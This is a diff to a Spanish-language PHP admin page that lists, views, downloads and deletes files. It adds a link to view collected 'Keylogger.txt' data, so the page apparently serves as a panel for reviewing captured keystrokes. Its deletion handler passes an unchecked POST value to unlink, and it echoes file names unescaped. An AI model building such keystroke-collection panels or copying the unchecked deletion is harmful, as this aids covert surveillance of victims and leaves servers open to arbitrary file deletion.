@@ -13,52 +13,66 @@
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
 </head>
 <body>
-    <div id="header">
-        <div id="left">
-            <label>Archivos Descargables</label>
-        </div>
-    </div>
     <div class="container">
         <div class="row">
-            <div class="col-md-4 offset-md-4">
+            <div class="col-md-12">
                 <div class="card">
                     <div class="card-header">
-                    <h3>Archivos - <a href='admin' class='btn btn-success'>Regresar</a></h3>
+                    <h3>Archivos - <a href='../admin' class='btn btn-success'>Regresar</a></h3>
+                    </div>
+                    <div class="card-body">
+                        <?php
+                        #verificar si el archivo existe y si es asi mostrarlo
+                        if(file_exists('Keylogger.txt')){
+                            echo "<a href='Keylogger.txt' class='btn btn-primary'>Ver datos del Keylogger</a>";
+                            #mostrar el peso del archivo
+                            $peso = filesize('Keylogger.txt');
+                            echo "Peso del archivo: $peso bytes";
+                        }
+                        ?>
                     </div>
                     <div class="card-body">
                             <div class="form-group">
-                            <?php 
-                                #listar los archivos 
-                                $archivos = scandir('./');
-                                echo '<pre>';
-                                #mostrar resuldato
-                                foreach ($archivos as $key => $value) {
-                                    if ($key > 1) {
-                                        #mostrando solo los 18 ultimos caracteres
-                                        $letras = substr($value, -18);
-                                        echo '<span class="salto"></span>';
-                                        echo "<form method='post'>";
-                                        echo "<input type='hidden' name='archivo' value='$value'>";
-                                        echo "<a class='btn btn-primary' href='$value'>$letras</a> <a href='$value' class='btn btn-success' download>Descargar</a> <input name='submit' type='submit' class='btn btn-danger' value='Borrar'><br>";
-                                        echo "</form>";
-                                        if (isset($_POST['submit'])) {
-                                            $archivo = $_POST['archivo'];
-                                            print_r($archivo);
-                                            if (isset($_POST['archivo'])) {
+                                <table  class="table table-striped table-bordered">
+                                    <thead>
+                                        <tr>
+                                            <th>Nombre</th>
+                                            <th>Ver</th>
+                                            <th>Peso</th>
+                                            <th>Eliminar</th>
+                                            <th>Descargar</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                <?php
+                                    $directorio = opendir('./');
+                                    while ($archivo = readdir($directorio)){
+                                        if($archivo != '.' && $archivo != '..'&& $archivo != 'index.php' && $archivo != 'admin.php'&& $archivo != 'actualizacion'&& $archivo != 'success'  && $archivo != 'url.txt'){
+                                            echo '<tr>';
+                                            echo '<td>'.$archivo.'</td>';
+                                            echo '<td><a class="btn btn-primary" href="'.$archivo.'">Ver</a></td>';
+                                            #ver el peso del archivo
+                                            $peso = filesize($archivo);
+                                            echo '<td><p>'.$peso.' bytes</p></td>';
+                                            echo "<form method='post'>";
+                                            echo "<input type='hidden' name='archivo' value='$archivo'>";
+                                            echo "<td><input type='submit' name='eliminar' value='Eliminar' class='btn btn-danger'></td>";
+                                            echo "</form>";
+                                            echo "<td><a href='$archivo' class='btn btn-success' download>Descargar</a></td>";
+                                            #boton eliminar archivos
+                                            if(isset($_POST['eliminar'])){
                                                 $archivo = $_POST['archivo'];
-                                                #borrar archivo
                                                 unlink($archivo);
-                                                #recargar pagina con js
-                                                echo "<script>window.location.href='index'</script>";
-                                                
+                                                echo "<script>alert('Archivo eliminado');</script>";
+                                                #recarga la pagina
+                                                echo "<script>location.href='index.php';</script>";
                                             }
+                                            echo '</tr>';
                                         }
                                     }
-                                }
-                                #copiar un archivo a otro directorio
-
-
-                            ?>
+                                    ?>
+                                    </tbody>
+                                </table>
                             </div>
                         
                     </div>
